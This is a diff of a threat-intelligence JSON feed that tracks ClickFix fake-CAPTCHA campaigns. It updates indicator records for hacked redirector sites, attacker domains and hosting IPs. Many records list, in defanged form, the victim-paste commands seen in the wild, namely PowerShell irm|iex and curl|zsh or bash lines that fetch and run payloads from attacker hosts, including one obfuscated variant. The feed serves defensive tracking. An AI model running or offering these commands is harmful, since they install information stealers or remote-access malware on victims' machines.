@@ -5,7 +5,7 @@
   "short": "Fake checks that get victims to paste and run a command",
   "summary": "A fake CAPTCHA, browser update or error message, usually injected into a hacked legitimate website, copies a command to the clipboard and tells the victim to paste it into the Run dialog, a terminal or PowerShell. The command downloads and runs malware, typically an information stealer or a remote-access tool. Some campaigns fetch their next stage from a public blockchain so the hacked site never has to change."
  },
- "count": 4984,
+ "count": 4981,
  "indicators": [
   {
    "indicator": "1.234.27.94",
@@ -9896,7 +9896,7 @@
    "role": "Redirector",
    "status": "online",
    "first_seen": "2026-10-18",
-   "last_seen": "2026-11-07",
+   "last_seen": "2026-11-08",
    "last_online": "2026-11-08",
    "offline_since": null,
    "url": "https://academicpipelinedatabase.net/",
@@ -9914,7 +9914,7 @@
      "asn": "AS209242",
      "org": "CLOUDFLARESPECTRUM Cloudflare London, LLC, US",
      "first_seen": "2026-10-18",
-     "last_seen": "2026-11-07"
+     "last_seen": "2026-11-08"
     },
     {
      "ip": "141.193.213.10",
@@ -9929,7 +9929,7 @@
      "host": "academicpipelinedatabase.net",
      "status": "online",
      "first_seen": "2026-10-18",
-     "last_seen": "2026-11-07"
+     "last_seen": "2026-11-08"
     }
    ],
    "actor": null,
@@ -19118,13 +19118,15 @@
    "actor": null,
    "actor_link": null,
    "commands": [
-    "(irm 'hxxps[:]//trustchecknes[.]com/dan_proliv/[id]')|iex",
-    "curl -s $(echo \"[encoded]\" | openssl base64 -d -A) | zsh ; curl -fsS 'hxxps[:]//xorados[.]com/x/dan_proliv' >/dev/null"
+    "curl -s $(echo \"[encoded]\" | openssl base64 -d -A) | zsh ; curl -fsS 'hxxps[:]//xorados[.]com/x/dan_proliv' >/dev/null",
+    "(irm 'hxxps[:]//t-trustresnew[.]com/dan_proliv/[id]')|iex",
+    "(irm 'hxxps[:]//trustchecknes[.]com/dan_proliv/[id]')|iex"
    ],
    "connects_to": [
-    "trustchecknes.com",
     "xorados.com",
-    "trek-72.com"
+    "trek-72.com",
+    "t-trustresnew.com",
+    "trustchecknes.com"
    ],
    "lure_from": [
     "interseq.at"
@@ -24518,64 +24520,6 @@
    ]
   },
   {
-   "indicator": "arraedlg.net",
-   "type": "domain",
-   "category": "clickfix",
-   "campaign": null,
-   "role": "Redirector",
-   "status": "online",
-   "first_seen": "2026-11-02",
-   "last_seen": "2026-11-05",
-   "last_online": "2026-11-08",
-   "offline_since": null,
-   "url": "https://arraedlg.net/ar/",
-   "brand": null,
-   "product": null,
-   "hosting": "Cloudflare (proxied)",
-   "dns": "Cloudflare",
-   "ip": "104.21.55.242",
-   "asn": "AS13335",
-   "org": "CLOUDFLARENET - Cloudflare, Inc., US",
-   "country": null,
-   "ips": [
-    {
-     "ip": "104.21.55.242",
-     "asn": "AS13335",
-     "org": "CLOUDFLARENET - Cloudflare, Inc., US",
-     "first_seen": "2026-11-03",
-     "last_seen": "2026-11-05"
-    },
-    {
-     "ip": "172.67.174.118",
-     "asn": "AS13335",
-     "org": "CLOUDFLARENET - Cloudflare, Inc., US",
-     "first_seen": "2026-11-02",
-     "last_seen": "2026-11-04"
-    }
-   ],
-   "hosts": [
-    {
-     "host": "arraedlg.net",
-     "status": "online",
-     "first_seen": "2026-11-02",
-     "last_seen": "2026-11-05"
-    }
-   ],
-   "actor": null,
-   "actor_link": null,
-   "commands": [
-    "(irm 'hxxps[:]//trustchecknes[.]com/ae8ouxb9gx/[id]')|iex",
-    "curl -s $(echo \"[encoded]\" | openssl base64 -d -A) | zsh"
-   ],
-   "connects_to": [
-    "trustchecknes.com",
-    "trek-72.com"
-   ],
-   "lure_from": [
-    "interseq.at"
-   ]
-  },
-  {
    "indicator": "arredamentichiarolegno.it",
    "type": "domain",
    "category": "clickfix",
@@ -28077,57 +28021,6 @@
    ]
   },
   {
-   "indicator": "attelectricmotor.co.id",
-   "type": "domain",
-   "category": "clickfix",
-   "campaign": null,
-   "role": "Redirector",
-   "status": "online",
-   "first_seen": "2026-11-02",
-   "last_seen": "2026-11-04",
-   "last_online": "2026-11-08",
-   "offline_since": null,
-   "url": "https://www.attelectricmotor.co.id/",
-   "brand": null,
-   "product": null,
-   "hosting": "CV Andhika Pratama Sanggoro",
-   "dns": "velocitydeveloper.net",
-   "ip": "157.66.55.81",
-   "asn": "AS141892",
-   "org": "IDNIC-SENGKED-AS-ID - CV Andhika Pratama Sanggoro, ID",
-   "country": "ID",
-   "ips": [
-    {
-     "ip": "157.66.55.81",
-     "asn": "AS141892",
-     "org": "IDNIC-SENGKED-AS-ID - CV Andhika Pratama Sanggoro, ID",
-     "first_seen": "2026-11-02",
-     "last_seen": "2026-11-04"
-    }
-   ],
-   "hosts": [
-    {
-     "host": "www.attelectricmotor.co.id",
-     "status": "online",
-     "first_seen": "2026-11-02",
-     "last_seen": "2026-11-04"
-    }
-   ],
-   "actor": null,
-   "actor_link": null,
-   "commands": [
-    "(irm 'hxxps[:]//trustchecknes[.]com/ae8ouxb9gx/[id]')|iex",
-    "curl -s $(echo \"[encoded]\" | openssl base64 -d -A) | zsh"
-   ],
-   "connects_to": [
-    "trustchecknes.com",
-    "trek-72.com"
-   ],
-   "lure_from": [
-    "interseq.at"
-   ]
-  },
-  {
    "indicator": "atttowing.com.au",
    "type": "domain",
    "category": "clickfix",
@@ -28796,12 +28689,14 @@
    "actor": null,
    "actor_link": null,
    "commands": [
-    "(irm 'hxxps[:]//trustchecknes[.]com/ae8ouxb9gx/[id]')|iex",
-    "curl -s $(echo \"[encoded]\" | openssl base64 -d -A) | zsh"
+    "curl -s $(echo \"[encoded]\" | openssl base64 -d -A) | zsh",
+    "(irm 'hxxps[:]//t-trustresnew[.]com/ae8ouxb9gx/[id]')|iex",
+    "(irm 'hxxps[:]//trustchecknes[.]com/ae8ouxb9gx/[id]')|iex"
    ],
    "connects_to": [
-    "trustchecknes.com",
-    "trek-72.com"
+    "trek-72.com",
+    "t-trustresnew.com",
+    "trustchecknes.com"
    ],
    "lure_from": [
     "interseq.at"
@@ -39020,13 +38915,15 @@
    "actor": null,
    "actor_link": null,
    "commands": [
-    "(irm 'hxxps[:]//trustchecknes[.]com/dan_proliv/[id]')|iex",
-    "curl -s $(echo \"[encoded]\" | openssl base64 -d -A) | zsh ; curl -fsS 'hxxps[:]//xorados[.]com/x/dan_proliv' >/dev/null"
+    "curl -s $(echo \"[encoded]\" | openssl base64 -d -A) | zsh ; curl -fsS 'hxxps[:]//xorados[.]com/x/dan_proliv' >/dev/null",
+    "(irm 'hxxps[:]//t-trustresnew[.]com/dan_proliv/[id]')|iex",
+    "(irm 'hxxps[:]//trustchecknes[.]com/dan_proliv/[id]')|iex"
    ],
    "connects_to": [
-    "trustchecknes.com",
     "xorados.com",
-    "trek-72.com"
+    "trek-72.com",
+    "t-trustresnew.com",
+    "trustchecknes.com"
    ],
    "lure_from": [
     "interseq.at"
@@ -39072,12 +38969,14 @@
    "actor": null,
    "actor_link": null,
    "commands": [
-    "(irm 'hxxps[:]//trustchecknes[.]com/ae8ouxb9gx/[id]')|iex",
-    "curl -s $(echo \"[encoded]\" | openssl base64 -d -A) | zsh"
+    "curl -s $(echo \"[encoded]\" | openssl base64 -d -A) | zsh",
+    "(irm 'hxxps[:]//t-trustresnew[.]com/ae8ouxb9gx/[id]')|iex",
+    "(irm 'hxxps[:]//trustchecknes[.]com/ae8ouxb9gx/[id]')|iex"
    ],
    "connects_to": [
-    "trustchecknes.com",
-    "trek-72.com"
+    "trek-72.com",
+    "t-trustresnew.com",
+    "trustchecknes.com"
    ],
    "lure_from": [
     "interseq.at"
@@ -49520,9 +49419,11 @@
    "actor": null,
    "actor_link": null,
    "commands": [
+    "(irm 'hxxps[:]//t-trustresnew[.]com/Girya/[id]')|iex",
     "(irm 'hxxps[:]//trustchecknes[.]com/Girya/[id]')|iex"
    ],
    "connects_to": [
+    "t-trustresnew.com",
     "trustchecknes.com"
    ],
    "lure_from": [
@@ -60670,13 +60571,15 @@
    "actor": null,
    "actor_link": null,
    "commands": [
-    "(irm 'hxxps[:]//trustchecknes[.]com/dan_proliv/[id]')|iex",
-    "curl -s $(echo \"[encoded]\" | openssl base64 -d -A) | zsh ; curl -fsS 'hxxps[:]//xorados[.]com/x/dan_proliv' >/dev/null"
+    "curl -s $(echo \"[encoded]\" | openssl base64 -d -A) | zsh ; curl -fsS 'hxxps[:]//xorados[.]com/x/dan_proliv' >/dev/null",
+    "(irm 'hxxps[:]//t-trustresnew[.]com/dan_proliv/[id]')|iex",
+    "(irm 'hxxps[:]//trustchecknes[.]com/dan_proliv/[id]')|iex"
    ],
    "connects_to": [
-    "trustchecknes.com",
     "xorados.com",
-    "trek-72.com"
+    "trek-72.com",
+    "t-trustresnew.com",
+    "trustchecknes.com"
    ],
    "lure_from": [
     "interseq.at"
@@ -72148,12 +72051,14 @@
    "actor": null,
    "actor_link": null,
    "commands": [
-    "(irm 'hxxps[:]//trustchecknes[.]com/ae8ouxb9gx/[id]')|iex",
-    "curl -s $(echo \"[encoded]\" | openssl base64 -d -A) | zsh"
+    "curl -s $(echo \"[encoded]\" | openssl base64 -d -A) | zsh",
+    "(irm 'hxxps[:]//t-trustresnew[.]com/ae8ouxb9gx/[id]')|iex",
+    "(irm 'hxxps[:]//trustchecknes[.]com/ae8ouxb9gx/[id]')|iex"
    ],
    "connects_to": [
-    "trustchecknes.com",
-    "trek-72.com"
+    "trek-72.com",
+    "t-trustresnew.com",
+    "trustchecknes.com"
    ],
    "lure_from": [
     "interseq.at"
@@ -79408,12 +79313,14 @@
    "actor_link": null,
    "commands": [
     "curl -s $(echo \"[encoded]\" | openssl base64 -d -A) | zsh ; curl -fsS 'hxxps[:]//xorados[.]com/x/dan_proliv' >/dev/null",
-    "(irm 'hxxps[:]//trustchecknes[.]com/dan_proliv/[id]')|iex",
-    "(irm 'hxxps[:]//t-trustrest[.]com/dan_proliv/[id]' -UserAgent 'WUA/[id]' -Headers @{'X-WUA'='[id]'} -TimeoutSec 45)|iex"
+    "(irm 'hxxps[:]//lepafonso[.]bz/proliv_dante/[id]' -Headers @{'X-WUA'='[id]'} -TimeoutSec 45)|&('i'+'e'+'x')",
+    "(irm 'hxxps[:]//t-trustresnew[.]com/dan_proliv/[id]')|iex"
    ],
    "connects_to": [
     "xorados.com",
     "trek-72.com",
+    "lepafonso.bz",
+    "t-trustresnew.com",
     "trustchecknes.com",
     "t-trustrest.com"
    ],
@@ -82936,7 +82843,10 @@
     "verifyidentrob01.cc",
     "ubbrobccheck20.cc"
    ],
-   "lure_from": []
+   "lure_from": [
+    "fcdnbovres.cc",
+    "fudcomcheck.art"
+   ]
   },
   {
    "indicator": "eliorambaldi.com",
@@ -86520,13 +86430,15 @@
    "actor": null,
    "actor_link": null,
    "commands": [
-    "(irm 'hxxps[:]//trustchecknes[.]com/dan_proliv/[id]')|iex",
-    "curl -s $(echo \"[encoded]\" | openssl base64 -d -A) | zsh ; curl -fsS 'hxxps[:]//xorados[.]com/x/dan_proliv' >/dev/null"
+    "curl -s $(echo \"[encoded]\" | openssl base64 -d -A) | zsh ; curl -fsS 'hxxps[:]//xorados[.]com/x/dan_proliv' >/dev/null",
+    "(irm 'hxxps[:]//t-trustresnew[.]com/dan_proliv/[id]')|iex",
+    "(irm 'hxxps[:]//trustchecknes[.]com/dan_proliv/[id]')|iex"
    ],
    "connects_to": [
-    "trustchecknes.com",
     "xorados.com",
-    "trek-72.com"
+    "trek-72.com",
+    "t-trustresnew.com",
+    "trustchecknes.com"
    ],
    "lure_from": [
     "interseq.at"
@@ -90200,8 +90112,9 @@
    ],
    "lure_from": [
     "verifyidentrob01.cc",
+    "fudcomcheck.art",
     "govrobczxc.cc",
-    "fudcomcheck.art"
+    "fcdnbovres.cc"
    ]
   },
   {
@@ -90244,13 +90157,15 @@
    "actor": null,
    "actor_link": null,
    "commands": [
-    "(irm 'hxxps[:]//trustchecknes[.]com/dan_proliv/[id]')|iex",
-    "curl -s $(echo \"[encoded]\" | openssl base64 -d -A) | zsh ; curl -fsS 'hxxps[:]//xorados[.]com/x/dan_proliv' >/dev/null"
+    "curl -s $(echo \"[encoded]\" | openssl base64 -d -A) | zsh ; curl -fsS 'hxxps[:]//xorados[.]com/x/dan_proliv' >/dev/null",
+    "(irm 'hxxps[:]//t-trustresnew[.]com/dan_proliv/[id]')|iex",
+    "(irm 'hxxps[:]//trustchecknes[.]com/dan_proliv/[id]')|iex"
    ],
    "connects_to": [
-    "trustchecknes.com",
     "xorados.com",
-    "trek-72.com"
+    "trek-72.com",
+    "t-trustresnew.com",
+    "trustchecknes.com"
    ],
    "lure_from": [
     "interseq.at"
@@ -90296,13 +90211,15 @@
    "actor": null,
    "actor_link": null,
    "commands": [
-    "(irm 'hxxps[:]//trustchecknes[.]com/dan_proliv/[id]')|iex",
-    "curl -s $(echo \"[encoded]\" | openssl base64 -d -A) | zsh ; curl -fsS 'hxxps[:]//xorados[.]com/x/dan_proliv' >/dev/null"
+    "curl -s $(echo \"[encoded]\" | openssl base64 -d -A) | zsh ; curl -fsS 'hxxps[:]//xorados[.]com/x/dan_proliv' >/dev/null",
+    "(irm 'hxxps[:]//t-trustresnew[.]com/dan_proliv/[id]')|iex",
+    "(irm 'hxxps[:]//trustchecknes[.]com/dan_proliv/[id]')|iex"
    ],
    "connects_to": [
-    "trustchecknes.com",
     "xorados.com",
-    "trek-72.com"
+    "trek-72.com",
+    "t-trustresnew.com",
+    "trustchecknes.com"
    ],
    "lure_from": [
     "interseq.at"
@@ -95867,12 +95784,14 @@
    "actor": null,
    "actor_link": null,
    "commands": [
-    "(irm 'hxxps[:]//trustchecknes[.]com/ae8ouxb9gx/[id]')|iex",
-    "curl -s $(echo \"[encoded]\" | openssl base64 -d -A) | zsh"
+    "curl -s $(echo \"[encoded]\" | openssl base64 -d -A) | zsh",
+    "(irm 'hxxps[:]//t-trustresnew[.]com/ae8ouxb9gx/[id]')|iex",
+    "(irm 'hxxps[:]//trustchecknes[.]com/ae8ouxb9gx/[id]')|iex"
    ],
    "connects_to": [
-    "trustchecknes.com",
-    "trek-72.com"
+    "trek-72.com",
+    "t-trustresnew.com",
+    "trustchecknes.com"
    ],
    "lure_from": [
     "interseq.at"
@@ -97293,9 +97212,11 @@
    "actor": null,
    "actor_link": null,
    "commands": [
+    "(irm 'hxxps[:]//t-trustresnew[.]com/Girya/[id]')|iex",
     "(irm 'hxxps[:]//trustchecknes[.]com/Girya/[id]')|iex"
    ],
    "connects_to": [
+    "t-trustresnew.com",
     "trustchecknes.com"
    ],
    "lure_from": [
@@ -99246,8 +99167,9 @@
     "verifyidentrob01.cc"
    ],
    "lure_from": [
+    "fudcomcheck.art",
     "govrobczxc.cc",
-    "fudcomcheck.art"
+    "fcdnbovres.cc"
    ]
   },
   {
@@ -101917,8 +101839,9 @@
     "ubbrobccheck20.cc"
    ],
    "lure_from": [
+    "fudcomcheck.art",
     "govrobczxc.cc",
-    "fudcomcheck.art"
+    "fcdnbovres.cc"
    ]
   },
   {
@@ -102474,66 +102397,6 @@
     "pizdalisibivet.org",
     "nikogdatakonebilo.cc",
     "ciganshina.org"
-   ]
-  },
-  {
-   "indicator": "georgiaonline.ge",
-   "type": "domain",
-   "category": "clickfix",
-   "campaign": null,
-   "role": "Redirector",
-   "status": "online",
-   "first_seen": "2026-11-01",
-   "last_seen": "2026-11-01",
-   "last_online": "2026-11-08",
-   "offline_since": null,
-   "url": "https://georgiaonline.ge/",
-   "brand": null,
-   "product": null,
-   "hosting": "Hostinger",
-   "dns": "dns-parking.com",
-   "ip": "89.116.190.253",
-   "asn": "AS47583",
-   "org": "AS-HOSTINGER Hostinger International Limited, CY",
-   "country": "US",
-   "ips": [
-    {
-     "ip": "89.116.190.253",
-     "asn": "AS47583",
-     "org": "AS-HOSTINGER Hostinger International Limited, CY",
-     "first_seen": "2026-11-01",
-     "last_seen": "2026-11-01"
-    },
-    {
-     "ip": "2a02:4780:b:1309:0:2295:e1e6:6",
-     "asn": "AS47583",
-     "org": "AS-HOSTINGER Hostinger International Limited, CY",
-     "first_seen": "2026-11-01",
-     "last_seen": "2026-11-01"
-    }
-   ],
-   "hosts": [
-    {
-     "host": "georgiaonline.ge",
-     "status": "online",
-     "first_seen": "2026-11-01",
-     "last_seen": "2026-11-01"
-    }
-   ],
-   "actor": null,
-   "actor_link": null,
-   "commands": [
-    "(irm 'hxxps[:]//lepafonso[.]bz/dantestraff2929/[id]' -UserAgent 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.6246.20 Safari/537.36' -Headers @{'X-WUA'='Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.6246.20 Safari/537.36'} -TimeoutSec 45)|iex",
-    "(irm 'hxxps[:]//trustchecknes[.]com/Girya/[id]')|iex",
-    "(irm 'hxxps[:]//t-trustrest[.]com/Girya/[id]' -UserAgent 'WUA/[id]' -Headers @{'X-WUA'='[id]'} -TimeoutSec 45)|iex"
-   ],
-   "connects_to": [
-    "lepafonso.bz",
-    "trustchecknes.com",
-    "t-trustrest.com"
-   ],
-   "lure_from": [
-    "interseq.at"
    ]
   },
   {
@@ -103836,8 +103699,9 @@
     "verifyidentrob01.cc"
    ],
    "lure_from": [
+    "fudcomcheck.art",
     "govrobczxc.cc",
-    "fudcomcheck.art"
+    "fcdnbovres.cc"
    ]
   },
   {
@@ -104710,8 +104574,9 @@
    ],
    "lure_from": [
     "verifyidentrob01.cc",
+    "fudcomcheck.art",
     "govrobczxc.cc",
-    "fudcomcheck.art"
+    "fcdnbovres.cc"
    ]
   },
   {
@@ -111849,12 +111714,14 @@
    "actor": null,
    "actor_link": null,
    "commands": [
-    "(irm 'hxxps[:]//trustchecknes[.]com/ae8ouxb9gx/[id]')|iex",
-    "curl -s $(echo \"[encoded]\" | openssl base64 -d -A) | zsh"
+    "curl -s $(echo \"[encoded]\" | openssl base64 -d -A) | zsh",
+    "(irm 'hxxps[:]//t-trustresnew[.]com/ae8ouxb9gx/[id]')|iex",
+    "(irm 'hxxps[:]//trustchecknes[.]com/ae8ouxb9gx/[id]')|iex"
    ],
    "connects_to": [
-    "trustchecknes.com",
-    "trek-72.com"
+    "trek-72.com",
+    "t-trustresnew.com",
+    "trustchecknes.com"
    ],
    "lure_from": [
     "interseq.at"
@@ -112553,12 +112420,14 @@
    "actor": null,
    "actor_link": null,
    "commands": [
-    "(irm 'hxxps[:]//trustchecknes[.]com/ae8ouxb9gx/[id]')|iex",
-    "curl -s $(echo \"[encoded]\" | openssl base64 -d -A) | zsh"
+    "curl -s $(echo \"[encoded]\" | openssl base64 -d -A) | zsh",
+    "(irm 'hxxps[:]//t-trustresnew[.]com/ae8ouxb9gx/[id]')|iex",
+    "(irm 'hxxps[:]//trustchecknes[.]com/ae8ouxb9gx/[id]')|iex"
    ],
    "connects_to": [
-    "trustchecknes.com",
-    "trek-72.com"
+    "trek-72.com",
+    "t-trustresnew.com",
+    "trustchecknes.com"
    ],
    "lure_from": [
     "interseq.at"
@@ -120360,12 +120229,14 @@
    "actor": null,
    "actor_link": null,
    "commands": [
-    "(irm 'hxxps[:]//trustchecknes[.]com/ae8ouxb9gx/[id]')|iex",
-    "curl -s $(echo \"[encoded]\" | openssl base64 -d -A) | zsh"
+    "curl -s $(echo \"[encoded]\" | openssl base64 -d -A) | zsh",
+    "(irm 'hxxps[:]//t-trustresnew[.]com/ae8ouxb9gx/[id]')|iex",
+    "(irm 'hxxps[:]//trustchecknes[.]com/ae8ouxb9gx/[id]')|iex"
    ],
    "connects_to": [
-    "trustchecknes.com",
-    "trek-72.com"
+    "trek-72.com",
+    "t-trustresnew.com",
+    "trustchecknes.com"
    ],
    "lure_from": [
     "interseq.at"
@@ -125756,9 +125627,11 @@
    "actor": null,
    "actor_link": null,
    "commands": [
+    "(irm 'hxxps[:]//t-trustresnew[.]com/Girya/[id]')|iex",
     "(irm 'hxxps[:]//trustchecknes[.]com/Girya/[id]')|iex"
    ],
    "connects_to": [
+    "t-trustresnew.com",
     "trustchecknes.com"
    ],
    "lure_from": [
@@ -131962,13 +131835,15 @@
    "actor": null,
    "actor_link": null,
    "commands": [
-    "(irm 'hxxps[:]//trustchecknes[.]com/dan_proliv/[id]')|iex",
-    "curl -s $(echo \"[encoded]\" | openssl base64 -d -A) | zsh ; curl -fsS 'hxxps[:]//xorados[.]com/x/dan_proliv' >/dev/null"
+    "curl -s $(echo \"[encoded]\" | openssl base64 -d -A) | zsh ; curl -fsS 'hxxps[:]//xorados[.]com/x/dan_proliv' >/dev/null",
+    "(irm 'hxxps[:]//t-trustresnew[.]com/dan_proliv/[id]')|iex",
+    "(irm 'hxxps[:]//trustchecknes[.]com/dan_proliv/[id]')|iex"
    ],
    "connects_to": [
-    "trustchecknes.com",
     "xorados.com",
-    "trek-72.com"
+    "trek-72.com",
+    "t-trustresnew.com",
+    "trustchecknes.com"
    ],
    "lure_from": [
     "interseq.at"
@@ -135976,13 +135851,15 @@
    "actor": null,
    "actor_link": null,
    "commands": [
-    "(irm 'hxxps[:]//trustchecknes[.]com/dan_proliv/[id]')|iex",
-    "curl -s $(echo \"[encoded]\" | openssl base64 -d -A) | zsh ; curl -fsS 'hxxps[:]//xorados[.]com/x/dan_proliv' >/dev/null"
+    "curl -s $(echo \"[encoded]\" | openssl base64 -d -A) | zsh ; curl -fsS 'hxxps[:]//xorados[.]com/x/dan_proliv' >/dev/null",
+    "(irm 'hxxps[:]//t-trustresnew[.]com/dan_proliv/[id]')|iex",
+    "(irm 'hxxps[:]//trustchecknes[.]com/dan_proliv/[id]')|iex"
    ],
    "connects_to": [
-    "trustchecknes.com",
     "xorados.com",
-    "trek-72.com"
+    "trek-72.com",
+    "t-trustresnew.com",
+    "trustchecknes.com"
    ],
    "lure_from": [
     "interseq.at"
@@ -155104,13 +154981,15 @@
    "actor": null,
    "actor_link": null,
    "commands": [
-    "(irm 'hxxps[:]//trustchecknes[.]com/dan_proliv/[id]')|iex",
-    "curl -s $(echo \"[encoded]\" | openssl base64 -d -A) | zsh ; curl -fsS 'hxxps[:]//xorados[.]com/x/dan_proliv' >/dev/null"
+    "curl -s $(echo \"[encoded]\" | openssl base64 -d -A) | zsh ; curl -fsS 'hxxps[:]//xorados[.]com/x/dan_proliv' >/dev/null",
+    "(irm 'hxxps[:]//t-trustresnew[.]com/dan_proliv/[id]')|iex",
+    "(irm 'hxxps[:]//trustchecknes[.]com/dan_proliv/[id]')|iex"
    ],
    "connects_to": [
-    "trustchecknes.com",
     "xorados.com",
-    "trek-72.com"
+    "trek-72.com",
+    "t-trustresnew.com",
+    "trustchecknes.com"
    ],
    "lure_from": [
     "interseq.at"
@@ -165576,12 +165455,14 @@
    "actor": null,
    "actor_link": null,
    "commands": [
-    "(irm 'hxxps[:]//trustchecknes[.]com/ae8ouxb9gx/[id]')|iex",
-    "curl -s $(echo \"[encoded]\" | openssl base64 -d -A) | zsh"
+    "curl -s $(echo \"[encoded]\" | openssl base64 -d -A) | zsh",
+    "(irm 'hxxps[:]//t-trustresnew[.]com/ae8ouxb9gx/[id]')|iex",
+    "(irm 'hxxps[:]//trustchecknes[.]com/ae8ouxb9gx/[id]')|iex"
    ],
    "connects_to": [
-    "trustchecknes.com",
-    "trek-72.com"
+    "trek-72.com",
+    "t-trustresnew.com",
+    "trustchecknes.com"
    ],
    "lure_from": [
     "interseq.at"
@@ -197646,9 +197527,12 @@
    "actor_link": null,
    "commands": [
     "IRM fastly[.]jsdelivr[.]net/g\"h\"/Katy7684/76-51fd-42c5-8717-[id]/10-9B-D0-8D-B2-CB | IEX",
+    "/bin/bash -c \"$(curl -A 'Mac OS X 10_15_7' -fsSL '7xxloy0b[.]esmaymedia[.]com/?ublib=5fe861ad-3670-4a4d-b79f-[id]')\"; echo \"\"BotGuard: Answer the protector challenge. Ref: 73282",
     "IRM fastly[.]jsdelivr[.]net/g\"h\"/sdf4563jvn/[id]/a379-[id] | IEX"
    ],
-   "connects_to": [],
+   "connects_to": [
+    "7xxloy0b.esmaymedia.com"
+   ],
    "lure_from": []
   },
   {
